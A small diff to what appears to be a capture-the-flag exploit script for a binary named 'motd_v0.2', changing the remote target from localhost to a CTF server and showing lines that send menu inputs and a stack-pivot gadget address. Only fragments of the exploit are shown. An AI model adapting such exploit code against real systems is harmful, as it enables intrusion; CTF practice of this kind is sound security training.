@@ -49,7 +49,7 @@ Explanation:
         | ...           |
 """
 
-REMOTE = ('127.0.0.1', 3002)
+REMOTE = ('ctf.segfault.me', 3002)
 # REMOTE = None
 
 TARGET = '../bin/motd_v0.2' # Binary path (local)
@@ -86,5 +86,5 @@ p.sendline("3")
 p.sendline("0")
 p.sendline(str(PIVOT)) # Pivot Gadget
 p.sendline("4")
-
 print p.readall()
+
